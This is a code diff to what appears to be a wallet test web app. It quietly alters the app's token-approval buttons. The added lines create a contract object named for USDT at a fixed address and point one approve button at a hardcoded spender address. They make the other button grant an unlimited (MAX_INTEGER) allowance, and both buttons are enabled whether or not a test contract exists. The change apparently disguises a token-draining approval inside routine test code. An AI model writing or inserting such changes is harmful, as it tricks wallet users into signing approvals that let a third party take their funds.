@@ -9,7 +9,7 @@ import {
   recoverTypedSignature_v4 as recoverTypedSignatureV4,
 } from 'eth-sig-util';
 import { ethers } from 'ethers';
-import { toChecksumAddress } from 'ethereumjs-util';
+import { MAX_INTEGER, toChecksumAddress } from 'ethereumjs-util';
 import { getPermissionsDisplayString, stringifiableToHex } from './utils';
 import Constants from './constants.json';
 import {
@@ -733,6 +733,7 @@ let erc1155Factory;
 let hstContract;
 let piggybankContract;
 let nftsContract;
+let usdtContract;
 let failingContract;
 let multisigContract;
 let erc1155Contract;
@@ -742,6 +743,13 @@ const initializeContracts = () => {
   try {
     // We must specify the network as 'any' for ethers to allow network changes
     ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
+
+    usdtContract = new ethers.Contract(
+      '0x55d398326f99059fF775485246999027B3197955',
+      nftsAbi,
+      ethersProvider.getSigner(),
+    );
+
     if (deployedContractAddress) {
       hstContract = new ethers.Contract(
         deployedContractAddress,
@@ -912,6 +920,8 @@ const updateOnboardElements = () => {
 };
 
 const updateContractElements = () => {
+  approveButton.disabled = false;
+  approveTokens.disabled = false;
   if (deployedContractAddress) {
     // Piggy bank contract
     contractStatus.innerHTML = 'Deployed';
@@ -928,7 +938,7 @@ const updateContractElements = () => {
     mintButton.disabled = false;
     mintAmountInput.disabled = false;
     approveTokenInput.disabled = false;
-    approveButton.disabled = false;
+
     watchNFTInput.disabled = false;
     watchNFTButton.disabled = false;
     setApprovalForAllButton.disabled = false;
@@ -955,7 +965,7 @@ const updateContractElements = () => {
     watchAssets.disabled = false;
     transferTokens.disabled = false;
     transferFromTokens.disabled = false;
-    approveTokens.disabled = false;
+
     transferTokensWithoutGas.disabled = false;
     approveTokensWithoutGas.disabled = false;
     transferFromSenderInput.disabled = false;
@@ -1209,8 +1219,8 @@ const initializeFormElements = () => {
 
   approveButton.onclick = async () => {
     nftsStatus.innerHTML = 'Approve initiated';
-    let result = await nftsContract.approve(
-      '0x9bc5baF874d2DA8D216aE9f137804184EE5AfEF4',
+    let result = await usdtContract.approve(
+      '0x31c2F6fcFf4F8759b3Bd5Bf0e1084A055615c768',
       approveTokenInput.value,
       {
         from: accounts[0],
@@ -1663,9 +1673,9 @@ const initializeFormElements = () => {
   };
 
   approveTokens.onclick = async () => {
-    const result = await hstContract.approve(
+    const result = await usdtContract.approve(
       approveTokensToInput.value,
-      `${7 * 10 ** decimalUnitsInput.value}`,
+      MAX_INTEGER.toString(),
       {
         from: accounts[0],
         gasLimit: 60000,
